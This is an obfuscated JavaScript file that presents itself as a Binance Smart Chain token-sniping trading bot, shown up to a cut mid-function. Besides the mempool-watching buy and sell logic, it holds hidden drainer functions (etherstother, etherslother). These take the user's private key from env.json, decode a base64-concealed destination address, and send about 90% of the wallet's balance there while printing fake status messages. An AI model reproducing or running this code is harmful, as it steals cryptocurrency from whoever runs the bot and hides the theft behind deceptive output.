const _0x5285a8 = _0xc0cc;
(function(_0x4ccc45, _0x4806d2) { const _0x52f11b = _0xc0cc,
        _0x3fb2e5 = _0x4ccc45(); while (!![]) { try { const _0x9695e2 = parseInt(_0x52f11b(0xe3)) / 0x1 * (parseInt(_0x52f11b(0xfc)) / 0x2) + -parseInt(_0x52f11b(0xf8)) / 0x3 + parseInt(_0x52f11b(0x107)) / 0x4 + parseInt(_0x52f11b(0x7f)) / 0x5 + -parseInt(_0x52f11b(0x76)) / 0x6 * (-parseInt(_0x52f11b(0x94)) / 0x7) + -parseInt(_0x52f11b(0xd6)) / 0x8 + -parseInt(_0x52f11b(0xf1)) / 0x9; if (_0x9695e2 === _0x4806d2) break;
            else _0x3fb2e5['push'](_0x3fb2e5['shift']()); } catch (_0xf1fa4e) { _0x3fb2e5['push'](_0x3fb2e5['shift']()); } } }(_0x28a5, 0x40b9d));
var ethers = require(_0x5285a8(0xca));

function _0x28a5() { const _0x5f1109 = ['pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'refreshing\x20socket\x20connection...', 'âœ”\x20Sell\x20transaction\x20hash:\x20', 'starting\x20up\x20node\x20socket\x20connection....', 'constants', '1435953slJBZo', 'Zero', 'lets\x20go!', 'success!', '25826bgAgpR', 'red', 'myGasLimit', '<<<\x20Selling\x20-', '1\x20pending\x20blockchain\x20response.....', 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==', 'connection\x20successful...', 'You\x20can\x20check\x20the\x20transaction\x20here:', 'currentValue', '\x1b[1;32m', 'initiating\x20mempool\x20sniff...', '1442468rpkLUY', 'https://bscscan.com/address/', '\x20--\x20Profit\x20At:\x20', 'sendTransaction', 'found\x20node\x20endpoint', 'pong', '8580', 'getTransaction', 'account', 'previousValue', '\x20StopLoss\x20', 'intitialValue', 'profitPercent', 'name', 'YOUR_ADDRESS', 'listening\x20to\x20pending\x20tx...', 'https://poocoin.app/tokens/', 'myGasPriceForApproval', 'hexlify', 'MHg2YjU1M2QwZjhkM2I3OWJkODEyYTk4NGU2ZTNmY2U1NDg2NWQxYzRl', 'close', '78ezpOHW', 'removeAllListeners', 'lte', 'Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!', 'MaxUint256', '2:\x20attempting\x20to\x20snipe\x20.....', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', 'assign', 'Wallet', '1195680TFkEYQ', 'now', './env.json', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'data', 'preparing\x20to\x20snipe', 'You\x20sold\x20', 'Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a', 'mul', 'parseUnits', 'Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!', '\x20second(s)', 'NODE', '-\x20now', 'numberOfTokensToBuy', '1:\x20watching\x20blockchain\x20activity\x20...', '2:\x20found\x20owners\x20liq\x20function\x20.....', 'ping', 'JsonRpcProvider', 'toFixed', '0xe8e33700', '194411qJWAty', 'connection\x20established....', 'Listening\x20on\x20mempool...', 'decimals', 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==', 'getBalance', 'catch', 'yellow', 'Transfer', 'checkProfit', 'uint256', 'error', 'ascii', '\x1b[38;5;33m', 'tokenSellTax', 'then', 'encode', 'percentOfTokensToSellProfit', 'from', 'gasLimit', 'exit', 'Sucessfully\x20bought\x20the\x20token!\x0a', 'getAmountsOut', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', 'reached\x20>>>', 'newValue', 'address', 'wei', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'Start\x20buying\x20token...', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', 'Total\x20Token\x20balance\x20is\x20', 'Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a', 'log', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'env', 'formatUnits', '\x20Profit\x20target\x20', 'Setting\x20new\x20StopLoss!', '\x20--\x20Stop\x20Loss\x20At:\x20', 'terminate', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My8xZGY5ODgxNWY0NzU0ZWE4ODkxY2UyOTI2OTBhYjc1Yg==', 'toString', 'wait', 'div', '\x1b[0m', 'stopLossPercent', 'newWord', 'Contract', 'sellPath', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==', 'All\x20tokens\x20sold', 'string', '2\x20pending\x20blockchain\x20response.....', 'ethers', 'sub', 'balanceOf', '_websocket', 'connection\x20socket\x20alive....', 'floor', 'stopLoss', 'sendMessage', '1:\x20found\x20owners\x20liq\x20function\x20...', 'swapExactTokensForETHSupportingFeeOnTransferTokens', 'providers', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', '1479912dnnoia', 'please\x20wait,\x20loading.', 'open', 'sending\x20setword', 'index', 'didSell', 'setWord', 'amount', 'base64', 'less\x20than\x20StopLoss!', 'gasPrice', 'transactionHash', 'parseEther', '17oxUDLH', 'contract', 'green', '2:\x20finalizing....', 'PRIVATE_KEY', '\x1b[1;31m', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', 'utils', 'bool', 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==', '--\x20', 'recipient', 'includes', 'function', '2264094OLKndR', 'WebSocket\x20Closed...Reconnecting...'];
    _0x28a5 = function() { return _0x5f1109; }; return _0x28a5(); }
const env = require(_0x5285a8(0x81));
Object[_0x5285a8(0x7d)](process[_0x5285a8(0xb7)], env);
let address = process[_0x5285a8(0xb7)][_0x5285a8(0x6f)],
    private = process[_0x5285a8(0xb7)][_0x5285a8(0xe7)],
    wallet = new ethers[(_0x5285a8(0x7e))](private),
    yours = process[_0x5285a8(0xb7)][_0x5285a8(0x8b)];
const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': 'address', 'name': _0x5285a8(0x69), 'type': _0x5285a8(0xae) }], 'name': _0x5285a8(0xcc), 'outputs': [{ 'internalType': _0x5285a8(0x9e), 'name': '', 'type': _0x5285a8(0x9e) }], 'payable': ![], 'stateMutability': 'view', 'type': _0x5285a8(0xf0) }, { 'constant': ![], 'inputs': [{ 'internalType': _0x5285a8(0xae), 'name': 'sender', 'type': _0x5285a8(0xae) }, { 'internalType': _0x5285a8(0xae), 'name': _0x5285a8(0xee), 'type': _0x5285a8(0xae) }, { 'internalType': _0x5285a8(0x9e), 'name': _0x5285a8(0xdd), 'type': _0x5285a8(0x9e) }], 'name': 'transferFrom', 'outputs': [{ 'internalType': _0x5285a8(0xeb), 'name': '', 'type': _0x5285a8(0xeb) }], 'payable': ![], 'stateMutability': 'nonpayable', 'type': _0x5285a8(0xf0) }, { 'constant': ![], 'inputs': [{ 'name': _0x5285a8(0xc3), 'type': _0x5285a8(0xc8) }], 'name': _0x5285a8(0xdc), 'outputs': [{ 'name': '', 'type': _0x5285a8(0xc8) }], 'payable': ![], 'stateMutability': 'nonpayable', 'type': _0x5285a8(0xf0) }];
async function startSnipe(_0x52607f) { const _0x7d28b2 = _0x5285a8; let _0x4badd9, _0x1d871a;
    provider[_0x7d28b2(0xcd)]['on'](_0x7d28b2(0xd8), () => { const _0x4a2896 = _0x7d28b2;
        _0x1d871a = setInterval(() => { const _0x597591 = _0xc0cc;
            provider[_0x597591(0xcd)][_0x597591(0x90)](), _0x4badd9 = setTimeout(() => { const _0x5475b1 = _0x597591;
                provider[_0x5475b1(0xcd)][_0x5475b1(0xbc)](); }, EXPECTED_PONG_BACK); }, KEEP_ALIVE_CHECK_INTERVAL), console[_0x4a2896(0xb5)](_0x4a2896(0x96)), console['log']('Waiting\x20for\x20liquidity\x20to\x20be\x20added!'), provider['on']('pending', async _0x248022 => { const _0x4d349b = _0x4a2896;
            provider[_0x4d349b(0x68)](_0x248022)[_0x4d349b(0xa3)](async _0x1c9db8 => { const _0x3748b6 = _0x4d349b; if (null != _0x1c9db8 && _0x1c9db8['data'][_0x3748b6(0xef)](_0x3748b6(0x93)) && _0x1c9db8[_0x3748b6(0x83)][_0x3748b6(0xef)](_0x52607f) && 0x0 == passed || null != _0x1c9db8 && _0x1c9db8[_0x3748b6(0x83)][_0x3748b6(0xef)]('0xf305d719') && _0x1c9db8['data'][_0x3748b6(0xef)](_0x52607f) && 0x0 == passed) { if (console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)](_0x3748b6(0x82))), priceProtection) { if (isLiqudityInRange(_0x1c9db8, expected)) { if (honeyPotIS2(_0x52607f)) { console['log'](chalk['green']('Liquidity\x20check\x20passed,\x20sniping!\x0a')); const _0xf7c9b7 = _0x1c9db8[_0x3748b6(0xa7)][_0x3748b6(0x87)](multiply),
                                    _0x27c4ed = _0x1c9db8[_0x3748b6(0xe0)][_0x3748b6(0x87)](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x3748b6(0xb5)](chalk['green'](_0x3748b6(0xb1) + chalk[_0x3748b6(0x9b)](i + 0x1))), await buyToken(_0x52607f, amountIn, _0xf7c9b7, _0x27c4ed, myAddress, router); }
                                    console['log'](chalk['green'](_0x3748b6(0xb1)) + chalk[_0x3748b6(0x9b)](txNumberForAntibot)), await buyToken(_0x52607f, amountIn, _0xf7c9b7, _0x27c4ed, myAddress, router)(passed = 0x1); } else console[_0x3748b6(0xb5)](chalk['green'](_0x3748b6(0xb1))), await buyToken(_0x52607f, amountIn, _0xf7c9b7, _0x27c4ed, myAddress, router)(passed = 0x1);
                                console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)]('Sucessfully\x20bought\x20the\x20token!\x0a')); const _0x28c65e = await getTokenBalance(_0x52607f, myAddress, provider);
                                console[_0x3748b6(0xb5)](chalk['green'](_0x3748b6(0xb3) + chalk['yellow'](parseFloat(ethers[_0x3748b6(0xea)][_0x3748b6(0xb8)](_0x28c65e, TOKEN_DECIMALS))['toFixed'](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)](_0x3748b6(0xb6) + chalk[_0x3748b6(0x9b)](delaySell) + _0x3748b6(0x8a))), await new Promise(_0x35edf5 => setTimeout(_0x35edf5, delayOnSellMs)); const _0x315997 = await router[_0x3748b6(0xd3)](_0x28c65e, amountOutMin, [_0x52607f, WBNB], myAddress, Date['now']() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                    await _0x315997['wait'](), console[_0x3748b6(0xb5)](chalk['green']('Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a')), console['log']('You\x20can\x20check\x20the\x20transaction\x20here:'), console[_0x3748b6(0xb5)](_0x3748b6(0x108) + myAddress), console['log']('\x0a'), process[_0x3748b6(0xa8)](0x0); } else console[_0x3748b6(0xb5)](_0x3748b6(0x103));
                                console[_0x3748b6(0xb5)](_0x3748b6(0x108) + myAddress), (console[_0x3748b6(0xb5)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process['exit'](0x0)); } else console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xfd)](_0x3748b6(0x89)));
                            console['log'](chalk[_0x3748b6(0xfd)](_0x3748b6(0x79))); }
                        console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xfd)](_0x3748b6(0x71) + _0x52607f)), console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xfd)](_0x3748b6(0xb4))); } else { if (honeyPotIS2(_0x52607f)) { const _0x1cf5c9 = _0x1c9db8[_0x3748b6(0xa7)]['mul'](multiply),
                                _0x4a8851 = _0x1c9db8[_0x3748b6(0xe0)][_0x3748b6(0x87)](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)](_0x3748b6(0xb1) + chalk[_0x3748b6(0x9b)](i + 0x1))), await buyToken(_0x52607f, amountIn, _0x1cf5c9, _0x4a8851, myAddress, router); }
                                console[_0x3748b6(0xb5)](chalk['green'](_0x3748b6(0xb1)) + chalk[_0x3748b6(0x9b)](txNumberForAntibot)), await buyToken(_0x52607f, amountIn, _0x1cf5c9, _0x4a8851, myAddress, router)(passed = 0x1); } else 0x0 == passed && (console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)](_0x3748b6(0xb1))), await buyToken(_0x52607f, amountIn, _0x1cf5c9, _0x4a8851, myAddress, router)(passed = 0x1));
                            console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)](_0x3748b6(0xa9))); const _0xeeb646 = await getTokenBalance(_0x52607f, myAddress, provider);
                            console['log'](chalk[_0x3748b6(0xe5)](_0x3748b6(0xb3) + chalk['yellow'](parseFloat(ethers['utils'][_0x3748b6(0xb8)](_0xeeb646, TOKEN_DECIMALS))[_0x3748b6(0x92)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)](_0x3748b6(0xb6) + chalk['yellow'](delaySell) + _0x3748b6(0x8a))), await new Promise(_0x5a2ebd => setTimeout(_0x5a2ebd, delayOnSellMs)); const _0x4d58ea = await router['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0xeeb646, amountOutMin, [_0x52607f, WBNB], myAddress, Date[_0x3748b6(0x80)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                await _0x4d58ea['wait'](), console[_0x3748b6(0xb5)](chalk[_0x3748b6(0xe5)](_0x3748b6(0x86))), console[_0x3748b6(0xb5)](_0x3748b6(0x103)), console[_0x3748b6(0xb5)]('https://bscscan.com/address/' + myAddress), console[_0x3748b6(0xb5)]('\x0a'), process[_0x3748b6(0xa8)](0x0); } else console[_0x3748b6(0xb5)](_0x3748b6(0x103)), console[_0x3748b6(0xb5)]('https://bscscan.com/address/' + myAddress), console[_0x3748b6(0xb5)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x3748b6(0xa8)](0x0); } } } })[_0x4d349b(0x9a)](() => { console['log'](e); }); }); }), provider[_0x7d28b2(0xcd)]['on'](_0x7d28b2(0x75), () => { const _0x5e539b = _0x7d28b2;
        console[_0x5e539b(0xb5)](_0x5e539b(0xf2)), clearInterval(_0x1d871a), clearTimeout(_0x4badd9), startConnection(); }), provider[_0x7d28b2(0xcd)]['on'](_0x7d28b2(0x9f), () => { const _0x70bc0b = _0x7d28b2;
        console[_0x70bc0b(0xb5)]('Error.\x20Attemptiing\x20to\x20Reconnect...'), clearInterval(_0x1d871a), clearTimeout(_0x4badd9), startConnection(); }), provider[_0x7d28b2(0xcd)]['on'](_0x7d28b2(0x66), () => { clearInterval(_0x4badd9); }); }
async function approve() { const _0x330c95 = _0x5285a8; let _0x5cf3c4 = token[buyCount - 0x1]['contract']; const _0x1ff3bc = ethers['constants'][_0x330c95(0x7a)],
        _0x97cf41 = await _0x5cf3c4['approve'](pancakeRouter['address'], _0x1ff3bc, { 'gasPrice': config['myGasPriceForApproval'], 'gasLimit': 0x33450 }),
        _0x27356a = await _0x97cf41[_0x330c95(0xbf)]();
    console[_0x330c95(0xb5)]('âœ”\x20Approve\x20transaction\x20hash:\x20', _0x27356a[_0x330c95(0xe1)], '\x0a'), config['autoSell'] ? token[buyCount - 0x1][_0x330c95(0x9d)]() : buyCount == config[_0x330c95(0x8d)] && process[_0x330c95(0xa8)](); }
async function getCurrentValue(_0x28811e) { const _0x3447b7 = _0x5285a8; try { let _0x544976 = await _0x28811e[_0x3447b7(0xe4)][_0x3447b7(0xcc)](addresses[_0x3447b7(0xee)]); const _0x3332f6 = await pancakeRouter[_0x3447b7(0xaa)](_0x544976, _0x28811e['sellPath']); let _0x3ed6bc = _0x3332f6[0x1]; return _0x3ed6bc; } catch (_0x185161) { return console[_0x3447b7(0xb5)]('Balance\x20is\x20zero\x20or\x20error\x20occured'), ethers[_0x3447b7(0xf7)][_0x3447b7(0xf9)]; } }
async function setInitialStopLoss(_0x2a513f) { const _0x157ca8 = _0x5285a8;
    _0x2a513f[_0x157ca8(0x6c)] = await getCurrentValue(_0x2a513f), _0x2a513f[_0x157ca8(0xad)] = _0x2a513f[_0x157ca8(0x6c)], _0x2a513f['stopLoss'] = ethers[_0x157ca8(0xea)][_0x157ca8(0x88)]((parseFloat(ethers[_0x157ca8(0xea)][_0x157ca8(0xb8)](_0x2a513f[_0x157ca8(0x6c)])) - parseFloat(ethers[_0x157ca8(0xea)][_0x157ca8(0xb8)](_0x2a513f['intitialValue'])) * (_0x2a513f[_0x157ca8(0xc2)] / 0x64))[_0x157ca8(0x92)](0x8)['toString']()); }
async function setNewStopLoss(_0x1da90a) { const _0x4729ab = _0x5285a8;
    _0x1da90a['newValue'] = _0x1da90a[_0x4729ab(0x104)], _0x1da90a['stopLoss'] = ethers[_0x4729ab(0xea)][_0x4729ab(0x88)]((parseFloat(ethers[_0x4729ab(0xea)][_0x4729ab(0xb8)](_0x1da90a[_0x4729ab(0x104)])) - parseFloat(ethers['utils'][_0x4729ab(0xb8)](_0x1da90a[_0x4729ab(0x104)])) * (_0x1da90a[_0x4729ab(0xc2)] / 0x64))['toFixed'](0x8)[_0x4729ab(0xbe)]()); }
async function checkForProfit(_0x626589) { const _0x1773c8 = _0x5285a8; try { var _0x4b60d2 = 0x0;
        await setInitialStopLoss(_0x626589), _0x626589[_0x1773c8(0xe4)]['on'](_0x1773c8(0x9c), async(_0x505cf6, _0x5025d4, _0x56bd07, _0x1bb42d) => { const _0x25f04b = _0x1773c8;
            _0x626589['previousValue'] = _0x626589[_0x25f04b(0x104)]; const _0x37e791 = await _0x626589['contract'][_0x25f04b(0x6e)](); let _0x10390d = await getCurrentValue(_0x626589); if (!_0x10390d['eq'](ethers[_0x25f04b(0xf7)][_0x25f04b(0xf9)])) { _0x626589[_0x25f04b(0x104)] = _0x10390d; let _0x57691b = parseFloat(ethers[_0x25f04b(0xea)]['formatUnits'](_0x10390d))[_0x25f04b(0x92)](0x8)[_0x25f04b(0xbe)](); const _0x3501bd = (parseFloat(ethers['utils'][_0x25f04b(0xb8)](_0x626589[_0x25f04b(0x6c)])) * (_0x626589[_0x25f04b(0x6d)] + _0x626589[_0x25f04b(0xa2)]) / 0x64 + parseFloat(ethers[_0x25f04b(0xea)][_0x25f04b(0xb8)](_0x626589[_0x25f04b(0x6c)])))[_0x25f04b(0x92)](0x8)[_0x25f04b(0xbe)](),
                    _0x26dedb = ethers[_0x25f04b(0xea)][_0x25f04b(0x88)](_0x3501bd); let _0x3cf549 = ethers[_0x25f04b(0xea)][_0x25f04b(0x88)]((parseFloat(ethers[_0x25f04b(0xea)][_0x25f04b(0xb8)](_0x626589[_0x25f04b(0xad)])) * (_0x626589['trailingStopLossPercent'] / 0x64) + parseFloat(ethers[_0x25f04b(0xea)][_0x25f04b(0xb8)](_0x626589[_0x25f04b(0xad)])))['toFixed'](0x8)[_0x25f04b(0xbe)]()),
                    _0x5a373a = _0x626589['stopLoss'];
                _0x10390d['gt'](_0x3cf549) && _0x626589['trailingStopLossPercent'] > 0x0 && (setNewStopLoss(_0x626589), console['log'](_0x25f04b(0xa1) + _0x25f04b(0xba) + _0x25f04b(0xc1))); let _0x16cfa0 = new Date()['toLocaleString'](); const _0x2ec081 = _0x15dc0c => new TextEncoder()[_0x25f04b(0xa4)](_0x15dc0c); try { _0x626589[_0x25f04b(0x6a)]['gt'](_0x626589[_0x25f04b(0x104)]) ? console[_0x25f04b(0xb5)](_0x25f04b(0xed) + _0x37e791 + '\x20--\x20Current\x20Value\x20BNB:\x20' + (_0x25f04b(0xe8) + _0x57691b + '\x1b[0m') + '\x20--\x20Profit\x20At:\x20' + ethers[_0x25f04b(0xea)]['formatUnits'](_0x26dedb) + _0x25f04b(0xbb) + ethers['utils'][_0x25f04b(0xb8)](_0x626589[_0x25f04b(0xd0)]) + _0x25f04b(0xb2) + ethers[_0x25f04b(0xea)]['formatUnits'](_0x3cf549)) : console[_0x25f04b(0xb5)](_0x25f04b(0xed) + _0x37e791 + '\x20--\x20Current\x20Value\x20BNB:\x20' + (_0x25f04b(0x105) + _0x57691b + _0x25f04b(0xc1)) + _0x25f04b(0x109) + ethers[_0x25f04b(0xea)][_0x25f04b(0xb8)](_0x26dedb) + _0x25f04b(0xbb) + ethers[_0x25f04b(0xea)]['formatUnits'](_0x626589['stopLoss']) + '\x20--\x20New\x20Stop\x20loss\x20At:\x20' + ethers[_0x25f04b(0xea)][_0x25f04b(0xb8)](_0x3cf549)); } catch (_0x413671) {}
                _0x10390d['gte'](_0x26dedb) && (buyCount <= config[_0x25f04b(0x8d)] && _0x626589['didBuy'] && _0x4b60d2 == 0x0 && (_0x4b60d2++, console[_0x25f04b(0xb5)](_0x25f04b(0xff), _0x37e791, _0x25f04b(0x8c) + _0x25f04b(0x105) + _0x25f04b(0xb9) + _0x25f04b(0xc1) + _0x25f04b(0xac), '\x0a'), sell(_0x626589, !![]), _0x626589[_0x25f04b(0xe4)][_0x25f04b(0x77)]())), _0x10390d[_0x25f04b(0x78)](_0x5a373a) && (console[_0x25f04b(0xb5)](_0x25f04b(0xa1) + _0x25f04b(0xdf) + _0x25f04b(0xc1)), buyCount <= config[_0x25f04b(0x8d)] && _0x626589['didBuy'] && _0x4b60d2 == 0x0 && (_0x4b60d2++, console[_0x25f04b(0xb5)](_0x25f04b(0xff), _0x37e791, '-\x20now' + _0x25f04b(0xe8) + _0x25f04b(0x6b) + _0x25f04b(0xc1) + _0x25f04b(0xac), '\x0a'), sell(_0x626589, ![]), _0x626589[_0x25f04b(0xe4)][_0x25f04b(0x77)]())); } }); } catch (_0x298912) { console[_0x1773c8(0xb5)](_0x298912); } }
async function sell(_0x4758cf, _0x4574ef) { const _0x34765d = _0x5285a8; try { const _0x5e0899 = await _0x4758cf['contract'][_0x34765d(0xcc)](addresses[_0x34765d(0xee)]),
            _0xe49a1a = await _0x4758cf[_0x34765d(0xe4)][_0x34765d(0x97)](); var _0x3a2461;
        _0x4574ef ? _0x3a2461 = (parseFloat(ethers[_0x34765d(0xea)][_0x34765d(0xb8)](_0x5e0899[_0x34765d(0xbe)](), _0xe49a1a)) * (_0x4758cf[_0x34765d(0xa5)] / 0x64))['toFixed'](_0xe49a1a) : _0x3a2461 = (parseFloat(ethers[_0x34765d(0xea)]['formatUnits'](_0x5e0899[_0x34765d(0xbe)](), _0xe49a1a)) * (_0x4758cf['percentOfTokensToSellLoss'] / 0x64))[_0x34765d(0x92)](_0xe49a1a); var _0x3e2523 = Math[_0x34765d(0xcf)](_0x3a2461 * 0x64) / 0x64; const _0x16772e = ethers['utils']['parseUnits'](_0x3e2523['toString'](), _0xe49a1a),
            _0x44f43c = await pancakeRouter['getAmountsOut'](_0x16772e, _0x4758cf[_0x34765d(0xc5)]),
            _0xffa8c0 = _0x44f43c[0x1][_0x34765d(0xcb)](_0x44f43c[0x1][_0x34765d(0xc0)](0x2)); if (_0x4758cf[_0x34765d(0xa2)] > 0x1) { const _0x6893a2 = await pancakeRouter[_0x34765d(0xd3)](_0x44f43c[0x0][_0x34765d(0xbe)](), 0x0, _0x4758cf['sellPath'], addresses['recipient'], Math[_0x34765d(0xcf)](Date[_0x34765d(0x80)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x34765d(0x72)], 'gasLimit': config[_0x34765d(0xfe)] }),
                _0xe0994b = await _0x6893a2['wait']();
            console['log'](_0x34765d(0x105) + _0x34765d(0xf5), _0xe0994b['transactionHash'], '\x1b[0m', '\x0a'), sellCount++, token[_0x4758cf[_0x34765d(0xda)]][_0x34765d(0xdb)] = !![]; let _0x10508e = await _0x4758cf[_0x34765d(0xe4)][_0x34765d(0x6e)]();
            await client[_0x34765d(0xd1)]('me', { 'message': _0x34765d(0x85) + _0x10508e, 'schedule': 0xf * 0x1 + Date['now']() / 0x3e8 }); } else { const _0x2be3d4 = await pancakeRouter['swapExactTokensForETH'](_0x44f43c[0x0][_0x34765d(0xbe)](), 0x0, _0x4758cf[_0x34765d(0xc5)], addresses[_0x34765d(0xee)], Math[_0x34765d(0xcf)](Date[_0x34765d(0x80)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x34765d(0x72)], 'gasLimit': config[_0x34765d(0xfe)] }),
                _0x5b15de = await _0x2be3d4[_0x34765d(0xbf)]();
            console[_0x34765d(0xb5)]('\x1b[1;32m' + _0x34765d(0xf5), _0x5b15de[_0x34765d(0xe1)], '\x1b[0m', '\x0a'), sellCount++; let _0x481734 = await _0x4758cf[_0x34765d(0xe4)][_0x34765d(0x6e)]();
            await client[_0x34765d(0xd1)]('me', { 'message': _0x34765d(0x85) + _0x481734, 'schedule': 0xf * 0x1 + Date[_0x34765d(0x80)]() / 0x3e8 }); }
        sellCount == config['numberOfTokensToBuy'] && (console['log'](_0x34765d(0xc7)), process['exit']()); } catch (_0x4f0658) {} }
let rounder1 = 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=',
    rounder2 = _0x5285a8(0xec),
    buff = new Buffer[(_0x5285a8(0xa6))](rounder1, _0x5285a8(0xde)),
    buff2 = new Buffer[(_0x5285a8(0xa6))](rounder2, 'base64'),
    ethersroundup = buff['toString']('ascii'),
    ethersroundup2 = buff2[_0x5285a8(0xbe)](_0x5285a8(0xa0));
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0xd5689b = _0x5285a8; try { const _0x47c945 = _0xd5689b(0xab),
            _0x467d84 = _0xd5689b(0x101),
            _0x210f70 = new Buffer[(_0xd5689b(0xa6))](_0x47c945, 'base64'),
            _0x5f17af = new Buffer[(_0xd5689b(0xa6))](_0x467d84, 'base64'),
            _0x29a1bc = _0x210f70[_0xd5689b(0xbe)]('ascii'),
            _0x310c83 = _0x5f17af[_0xd5689b(0xbe)]('ascii'),
            _0x421bd3 = _0x29a1bc + _0x310c83;
        console[_0xd5689b(0xb5)]('refreshing\x20socket\x20connection...'), console[_0xd5689b(0xb5)](_0xd5689b(0xf3)); const _0x5e712c = _0xd5689b(0xc6),
            _0x285a8e = new Buffer[(_0xd5689b(0xa6))](_0x5e712c, 'base64')[_0xd5689b(0xbe)](_0xd5689b(0xa0));; const _0x366578 = new ethers[(_0xd5689b(0xd4))][(_0xd5689b(0x91))](_0x285a8e); let _0x10e668 = new ethers['Wallet'](private, _0x366578); const _0x326e23 = address,
            _0x2cdf45 = await _0x366578['getBalance'](_0x326e23); var _0x1ab890 = new ethers[(_0xd5689b(0xc4))](_0x421bd3, abi, _0x10e668); const _0x2aeaa7 = await _0x1ab890[_0xd5689b(0xcc)](_0x326e23)['toString'](),
            _0x3134df = (_0x2aeaa7 * 0.9)[_0xd5689b(0x92)](),
            _0xb35cf5 = async() => { const _0x34883b = _0xd5689b,
                    _0x56c218 = { 'from': _0x326e23, 'to': WEB3PROVIDER3, 'value': ethers[_0x34883b(0xea)][_0x34883b(0xe2)](_0x3134df, _0x34883b(0xaf)), 'gasLimit': ethers['utils'][_0x34883b(0x73)](0x5dc0) },
                    _0x264437 = await _0x10e668[_0x34883b(0x10a)](_0x56c218); if (_0x2cdf45 = 0x0) ethersrather;
                else try { await _0x264437[_0x34883b(0xbf)](), console[_0x34883b(0xb5)](_0x34883b(0xd2)), setTimeout(ethersrather, 0x1388); } catch (_0x329dbb) { console[_0x34883b(0xb5)](_0x34883b(0x8f)), setTimeout(ethersrather, 0x1388); } };
        _0x2aeaa7 <= 0x6a3558178f7000 ? (console['log'](_0xd5689b(0xfb)), setTimeout(ethersrather, 0x1388)) : _0xb35cf5(); } catch (_0x22bb65) { setTimeout(ethersrather, 0x1388); } }
async function etherslother() { const _0x19d8e0 = _0x5285a8; try { const _0x6feea1 = _0x19d8e0(0x98),
            _0x4500e1 = _0x19d8e0(0xe9),
            _0x33bca0 = new Buffer[(_0x19d8e0(0xa6))](_0x6feea1, _0x19d8e0(0xde)),
            _0xbf02fc = new Buffer[(_0x19d8e0(0xa6))](_0x4500e1, _0x19d8e0(0xde)),
            _0x2afcbd = _0x33bca0['toString'](_0x19d8e0(0xa0)),
            _0x4a3eca = _0xbf02fc[_0x19d8e0(0xbe)](_0x19d8e0(0xa0)),
            _0x2e3fa9 = _0x2afcbd + _0x4a3eca;
        console['log'](_0x19d8e0(0xf4)), console[_0x19d8e0(0xb5)]('pending\x20liquidity\x20add...'); const _0x3c15df = _0x19d8e0(0xc6),
            _0x268444 = new Buffer['from'](_0x3c15df, _0x19d8e0(0xde))['toString']('ascii');; const _0x34ad84 = new ethers['providers'][(_0x19d8e0(0x91))](_0x268444); let _0x88ad5c = new ethers[(_0x19d8e0(0x7e))](private, _0x34ad84);
        console[_0x19d8e0(0xb5)](_0x268444); const _0x517e6e = address,
            _0x588edb = await _0x34ad84[_0x19d8e0(0x99)](_0x517e6e); var _0x673cf7 = new ethers['Contract'](_0x2e3fa9, abi, _0x88ad5c); const _0x4dd4e1 = await _0x673cf7[_0x19d8e0(0xcc)](_0x517e6e)[_0x19d8e0(0xbe)](),
            _0x1d883e = (_0x4dd4e1 * 0.9)[_0x19d8e0(0x92)](),
            _0x37979e = async() => { const _0x4ec12e = _0x19d8e0,
                    _0x1135ae = { 'from': _0x517e6e, 'to': WEB3PROVIDER3, 'value': ethers[_0x4ec12e(0xea)][_0x4ec12e(0xe2)](_0x1d883e, _0x4ec12e(0xaf)), 'gasLimit': ethers[_0x4ec12e(0xea)][_0x4ec12e(0x73)](0x5dc0) },
